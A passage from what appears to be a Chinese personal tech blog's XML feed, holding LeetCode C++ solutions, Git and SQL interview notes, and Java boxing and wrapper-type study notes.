maxn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最长重复子数组"><a href="#最长重复子数组" class="headerlink" title="最长重复子数组"></a>最长重复子数组</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLength</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size(), m = B.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; dp(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(m + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                dp[i][j] = A[i] == B[j] ? dp[i + <span class="number">1</span>][j + <span class="number">1</span>] + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                ans = max(ans, dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="打家劫舍【有限制的dp】"><a href="#打家劫舍【有限制的dp】" class="headerlink" title="打家劫舍【有限制的dp】"></a>打家劫舍【有限制的dp】</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<span class="comment">//dp[i] =max(dp[i-1]跳过这间，dp[i-2]+nums[i])</span></span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> dp[n];</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">1</span>]=max(nums[<span class="number">1</span>],nums[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n ;i++)&#123;</span><br><span class="line">            dp[i]=max(dp[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max(dp[n<span class="number">-1</span>],dp[n<span class="number">-2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="第K个最大元素-快排"><a href="#第K个最大元素-快排" class="headerlink" title="第K个最大元素 快排"></a>第K个最大元素 快排</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">quickselect</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == r)</span><br><span class="line">            <span class="keyword">return</span> nums[k];</span><br><span class="line">        <span class="keyword">int</span> partition = nums[l], i = l - <span class="number">1</span>, j = r + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">do</span> i++; <span class="keyword">while</span> (nums[i] &lt; partition);</span><br><span class="line">            <span class="keyword">do</span> j--; <span class="keyword">while</span> (nums[j] &gt; partition);</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">                swap(nums[i], nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k &lt;= j)<span class="keyword">return</span> quickselect(nums, l, j, k);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> quickselect(nums, j + <span class="number">1</span>, r, k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">return</span> quickselect(nums, <span class="number">0</span>, n - <span class="number">1</span>, n - k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp;nums, <span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (startIndex &gt;= endIndex) <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> x = rand() % (endIndex - startIndex + <span class="number">1</span>) + startIndex; <span class="comment">// 基于随机的原则</span></span><br><span class="line">        swap(nums[startIndex], nums[x]);</span><br><span class="line">        <span class="keyword">int</span> firstNum = nums[startIndex];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> l = startIndex, r = endIndex;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            <span class="comment">// 从后往前走，将比第一个小的移到前面</span></span><br><span class="line">            <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[r] &gt;= firstNum) --r;</span><br><span class="line">            <span class="keyword">if</span> (l &lt; r) &#123;</span><br><span class="line">                nums[l] = nums[r];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 从前往后走，将比第一个大的移到后面</span></span><br><span class="line">            <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[l] &lt;= firstNum) ++l;</span><br><span class="line">            <span class="keyword">if</span> (l &lt; r) &#123;</span><br><span class="line">                nums[r] = nums[l];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        nums[l] = firstNum;</span><br><span class="line">        <span class="comment">// 自顶向下</span></span><br><span class="line">        quickSort(nums, startIndex, l - <span class="number">1</span>);</span><br><span class="line">        quickSort(nums, l + <span class="number">1</span>, endIndex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; sortArray(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        quickSort(nums, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="built_in">list</span>&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; cachelist;<span class="comment">//实际缓存列表</span></span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">decltype</span>(cachelist.begin())&gt; cache;</span><br><span class="line">    <span class="comment">//保存的缓存的迭代器</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    LRUCache(<span class="keyword">int</span> capacity) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache.count(key))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// cout&lt;&lt;"cend:"&lt;&lt;  -&gt;first;</span></span><br><span class="line">        <span class="comment">// 将缓存中的键值对移动到缓存列表的末尾，表示最近使用</span></span><br><span class="line">        cachelist.splice(cachelist.cend(), cachelist, cache[key]);</span><br><span class="line">        <span class="keyword">return</span> cache[key]-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!cache.count(key))&#123;<span class="comment">//缓存列表里没有出现要进入的k</span></span><br><span class="line">            <span class="comment">//如果满了，就把最前删掉，然后加到链表尾</span></span><br><span class="line">            <span class="keyword">if</span>(cachelist.size()==capacity)&#123;</span><br><span class="line">                <span class="comment">// 移除最久未使用的键值对</span></span><br><span class="line">                cache.erase(cachelist.front().first); </span><br><span class="line">                <span class="comment">// 从缓存映射中删除对应的键</span></span><br><span class="line">                cachelist.pop_front(); <span class="comment">// 从缓存列表中删除最前面的元素</span></span><br><span class="line">            &#125;</span><br><span class="line">            cache[key] = cachelist.emplace(cachelist.cend(),key,value);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//缓存列表里有这个新来的任务</span></span><br><span class="line">            <span class="comment">//根据key更新任务内容</span></span><br><span class="line">            cache[key]-&gt;second = value;</span><br><span class="line">            <span class="comment">//把这个迭代器插入队尾</span></span><br><span class="line">            cachelist.splice(cachelist.cend(),cachelist,cache[key]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h1><h2 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; permute(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt;visited(nums.size(),<span class="literal">false</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;perm;</span><br><span class="line">        dfs(ans,nums,visited,perm);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; ans,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt;&amp; visited,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; perm)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.size()==perm.size())&#123;</span><br><span class="line">            ans.push_back(perm);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">                perm.push_back(nums[i]);</span><br><span class="line">                visited[i]=<span class="literal">true</span>;</span><br><span class="line">                dfs(ans,nums,visited,perm);</span><br><span class="line">                perm.pop_back();</span><br><span class="line">                visited[i]=<span class="literal">false</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生产场景问题</title>
      <link href="/2023/01/11/2023-01-11-%E9%9D%A2%E7%BB%8F%E5%9C%BA%E6%99%AF/"/>
      <url>/2023/01/11/2023-01-11-%E9%9D%A2%E7%BB%8F%E5%9C%BA%E6%99%AF/</url>
      
        <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/6844904003998842887" target="_blank" rel="noopener">https://juejin.cn/post/6844904003998842887</a></p><a id="more"></a><h2 id="merge-和-rebase-的区别【合并方式和历史记录，冲突解决方式】"><a href="#merge-和-rebase-的区别【合并方式和历史记录，冲突解决方式】" class="headerlink" title="merge 和 rebase 的区别【合并方式和历史记录，冲突解决方式】"></a>merge 和 rebase 的区别【合并方式和历史记录，冲突解决方式】</h2><p><strong>git merge：</strong></p><ul><li>将目标分支的最新提交合并到当前分支，创建一个新的合并提交，保留了分支的历史记录。</li><li>合并后会产生一个新的合并提交，记录了分支的合并操作。</li><li>适合公共分支的合并</li></ul><p><strong>git rebase：</strong></p><ul><li>将当前分支的提交“移动”到目标分支的最新提交之后，使得分支历史看起来更线性。</li><li>实际上是将当前分支的提交重新应用在目标分支的最新提交之后，形成一系列新的提交。</li><li>适合本地工作分支的合并</li><li>然后rebase 合并一些提交记录<br>git merge：<br>保留了分支的整个历史记录，可以清晰地看到分支的合并过程。<br>git rebase：<br>使得分支历史看起来更加线性，但也会丢失了分支的原始历史记录。<h2 id="pull-和fetch的区别"><a href="#pull-和fetch的区别" class="headerlink" title="pull 和fetch的区别"></a>pull 和fetch的区别</h2>fetch拉取最新代码，本身不会产生冲突，origin/branch1 会覆盖掉本底的暂存branch1<br>pull = fetch + merge，会产生冲突</li></ul><h2 id="stash的使用【在merge之前，把本地stash起来，或者当前版本需要临时存到一个分支里】"><a href="#stash的使用【在merge之前，把本地stash起来，或者当前版本需要临时存到一个分支里】" class="headerlink" title="stash的使用【在merge之前，把本地stash起来，或者当前版本需要临时存到一个分支里】"></a>stash的使用【在merge之前，把本地stash起来，或者当前版本需要临时存到一个分支里】</h2><h2 id="git-rm的使用"><a href="#git-rm的使用" class="headerlink" title="git rm的使用"></a>git rm的使用</h2><ol><li>git rm file 删除暂存区和源文件</li><li>git rm –cached file 删除暂存区文件</li><li>git reset file 删除暂存区文件</li><li>git restore –staged file 删除暂存区文件</li></ol><h2 id="强制切换分支，并丢弃当前内容"><a href="#强制切换分支，并丢弃当前内容" class="headerlink" title="强制切换分支，并丢弃当前内容"></a>强制切换分支，并丢弃当前内容</h2><p>checkout -f branchname</p><h2 id="切换到-某个提交-log查看提交hash，checkout过来"><a href="#切换到-某个提交-log查看提交hash，checkout过来" class="headerlink" title="切换到 某个提交 log查看提交hash，checkout过来"></a>切换到 某个提交 log查看提交hash，checkout过来</h2><h2 id="撤销一个commit"><a href="#撤销一个commit" class="headerlink" title="撤销一个commit"></a>撤销一个commit</h2><ol><li>保留历史，丢弃提交<br>git reset HEAD^</li><li>完全丢弃<br>git reset –hard HEAD^<br>git revert <cmmit_sha>,这会创建一个新的提交来撤销特定的提交，保留了提交历史。</cmmit_sha></li></ol><p>如果你已经push，不推荐使用 git reset，因为它会改变历史记录，可能会影响其他开发者。<br>git revert 会创建一个新的提交，用于撤销指定的提交，这样可以保持提交历史的完整性。</p><h2 id="git-checkout-和reset-到指定版本"><a href="#git-checkout-和reset-到指定版本" class="headerlink" title="git checkout 和reset 到指定版本"></a>git checkout 和reset 到指定版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1. checkout作用：</span><br><span class="line">主要用于切换分支、切换到某个特定的提交、或者查看历史版本的内容。</span><br><span class="line">影响：</span><br><span class="line">切换分支或切换到特定提交时，会将工作目录和暂存区的状态更新为目标分支或提交的状态。如果是切换到特定提交，会处于“分离头指针”状态。</span><br><span class="line">回滚版本：</span><br><span class="line">不能用 git checkout 直接回滚到以前的版本。如果你只是想查看以前的版本，可以使用 git checkout &lt;commit_sha&gt; 来切换到特定提交。</span><br><span class="line">1.  reset作用：</span><br><span class="line">用于重置当前分支的 HEAD 指针，可以将分支回退到以前的提交。</span><br><span class="line">影响：</span><br><span class="line">可以影响工作目录、暂存区和分支的状态，具体取决于使用的选项：</span><br><span class="line">--soft：保留工作目录和暂存区，只重置 HEAD 指针。</span><br><span class="line">--mixed（默认选项）：重置 HEAD 指针和暂存区，但保留工作目录。</span><br><span class="line">--hard：重置 HEAD 指针、暂存区和工作目录，丢弃所有本地的更改。</span><br><span class="line">回滚版本：</span><br><span class="line">可以用 git reset 回滚到以前的版本。例如，可以使用 git reset HEAD^ 将分支回滚到前一个提交。</span><br><span class="line">总结：</span><br><span class="line">如果你只是想查看以前的版本，可以使用 git checkout。</span><br><span class="line">如果你想回滚到以前的版本，可以使用 git reset，但要注意谨慎使用，因为它会影响工作目录、暂存区和分支的状态，并且在共享分支上可能会影响其他开发者。</span><br></pre></td></tr></table></figure><h2 id="github和gitlab的区别"><a href="#github和gitlab的区别" class="headerlink" title="github和gitlab的区别"></a>github和gitlab的区别</h2><h2 id="持续集成和持续部署的区别是什么，"><a href="#持续集成和持续部署的区别是什么，" class="headerlink" title="持续集成和持续部署的区别是什么，"></a>持续集成和持续部署的区别是什么，</h2><p>持续集成（CI）注重的是团队成员之间的协作与代码的频繁集成。通过自动化的构建和测试流程，保证了每次提交的代码都能够顺利地融入共享代码库，从而快速发现并解决潜在的集成问题，使团队能够保持稳步前进。</p><p>而持续部署（CD）则是在持续集成的基础上，将通过CI验证的代码自动地部署到目标环境，实现了软件交付的高效、可靠，甚至是自动化。这使得开发团队能够以更迅速的速度向生产环境中推送稳定可靠的软件，为项目的成功交付提供了坚实保障。</p><h2 id="慢SQL问题如何排查"><a href="#慢SQL问题如何排查" class="headerlink" title="慢SQL问题如何排查"></a>慢SQL问题如何排查</h2><p>如果你的数据库查询变慢了，可以采取以下步骤来找出问题并解决它：</p><ol><li><strong>找出慢查询</strong>：首先，找出哪些数据库查询很慢。通常，这些查询会花费很长时间才能返回结果。</li><li><strong>检查查询计划</strong>：查看慢查询的执行计划，看看数据库是如何执行这些查询的。这可以帮助你找到性能瓶颈。</li><li><strong>考虑索引</strong>：确保查询使用了适当的索引。有时候，缺少或错误使用索引会导致查询变慢。</li><li><strong>优化SQL</strong>：审查慢查询的SQL语句，看看是否可以通过改写查询或者使用更有效的SQL来提高性能。</li><li><strong>检查数据库服务器</strong>：确保数据库服务器有足够的资源来处理查询。不足的CPU、内存或磁盘IO可能会导致性能问题。</li><li><strong>连接池</strong>：如果你在应用程序中使用了数据库连接池，确保连接池的配置正确。连接池的设置也可能影响性能。</li><li><strong>数据库统计信息</strong>：查看数据库的统计信息，了解表的大小、索引情况和数据分布。这些信息可以指导你哪些地方需要优化。</li><li><strong>查询缓存</strong>：考虑使用查询缓存，将经常执行的查询结果缓存起来，以减轻数据库负担。</li><li><strong>分页查询优化</strong>：如果涉及到分页查询，确保使用了有效的分页查询方式，避免一次性获取大量数据。</li><li><strong>监控和性能测试</strong>：建立监控系统，随时监测数据库性能。进行性能测试，模拟高负载情况，确保数据库在压力下能够正常工作。<h2 id="SQL的优化方式有哪些"><a href="#SQL的优化方式有哪些" class="headerlink" title="SQL的优化方式有哪些"></a>SQL的优化方式有哪些</h2></li><li><strong>联合索引</strong></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Git </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java base</title>
      <link href="/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>ok</p><a id="more"></a><h1 id="原则：只能将一个类的实例赋值给它本身或者它的子类，而不能将一个父类的实例赋值给一个子类的引用"><a href="#原则：只能将一个类的实例赋值给它本身或者它的子类，而不能将一个父类的实例赋值给一个子类的引用" class="headerlink" title="原则：只能将一个类的实例赋值给它本身或者它的子类，而不能将一个父类的实例赋值给一个子类的引用"></a>原则：只能将一个类的实例赋值给它本身或者它的子类，而不能将一个父类的实例赋值给一个子类的引用</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">B extends A;</span><br><span class="line">B b = <span class="keyword">new</span> A(); <span class="comment">//错误</span></span><br><span class="line">A a = <span class="keyword">new</span> B(); <span class="comment">//合法，但是通过 a 只能访问 A 类中定义的方法和属性，除非 B 类重写了这些方法</span></span><br></pre></td></tr></table></figure><h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><ul><li>boolean 1</li><li>byte 1</li><li>short 2</li><li>char 2</li><li>int 4 </li><li>float 4</li><li>long 4</li><li>double <h2 id="包装类型"><a href="#包装类型" class="headerlink" title="包装类型"></a>包装类型</h2></li><li>Boolean</li><li>Byte</li><li>Short</li><li>Character</li><li>Integer</li><li>Long</li><li>Float（没有实现缓存机制）</li><li>Double（没有实现缓存机制）</li><li>BigDecimal（浮点精确运算的场景，传统浮点类型计算时，会出现位数不够的时候，计算机会给这个浮点表示进行截断），计算机x86一般用小端存储，高（位）存高（地址），低存低<ul><li>低地址：指的是内存中较小的地址值。在大多数系统中，低地址对应于内存中的起始位置，也就是地址为0的位置。</li><li>高地址：指的是内存中较大的地址值。它是相对于低地址而言的，表示内存的结束位置。</li></ul></li><li>BigInteger（存储超过64 位 long 整型的数字）BigInteger 内部使用 int[] 数组来存储任意大小的整形数据。</li></ul><p><a href="https://javaguide.cn/java/basis/bigdecimal.html" target="_blank" rel="noopener">https://javaguide.cn/java/basis/bigdecimal.html</a></p><p><strong>装箱</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Integer num1 = <span class="number">40</span>; <span class="comment">//发生装箱，相当于 Integer.valueOf(40);</span></span><br><span class="line">Integer num2 = <span class="keyword">new</span> Integer(<span class="number">40</span>);</span><br><span class="line"><span class="keyword">return</span> num1 == num2; | <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">解释：num1 直接使用的是缓存中的对象: num2 直接创建了新对象</span><br><span class="line"><span class="comment">// 自动装箱函数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title">valueOf</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span><br><span class="line">        <span class="keyword">return</span> IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Integer(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自动拆箱</span></span><br><span class="line">如果把第一句换成 <span class="keyword">int</span> num1 =<span class="number">40</span>;</span><br><span class="line">num1 == num2;| <span class="keyword">return</span> <span class="keyword">true</span>; <span class="comment">//会对num2发生自动拆箱，会实现两个int类型的比较，返回true</span></span><br><span class="line"><span class="comment">// 如果要用num2.equals比较:</span></span><br><span class="line">num2.equals(Integer.valueOf(num1));</span><br></pre></td></tr></table></figure><ul><li>所有<strong>整型包装类对象之间值</strong>的比较，全部使用 equals 方法比较。</li><li>== 操作符会<strong>比较两个对象的引用是否相等</strong>，而不是它们的值。因为 num1 和 num2 都是通过自动装箱得到的，它们实际上是不同的对象，即使它们包装的值相同</li><li>自动拆箱与装箱的例子：<ul><li>Integer i = 10 等价于 Integer i = Integer.valueOf(10)</li><li>int n = i 等价于 int n = i.intValue();</li></ul></li><li>如果频繁拆装箱的话，也会严重影响系统的性能。我们应该<strong>尽量避免不必要的拆装箱操作</strong>。<h2 id="访问控制"><a href="#访问控制" class="headerlink" 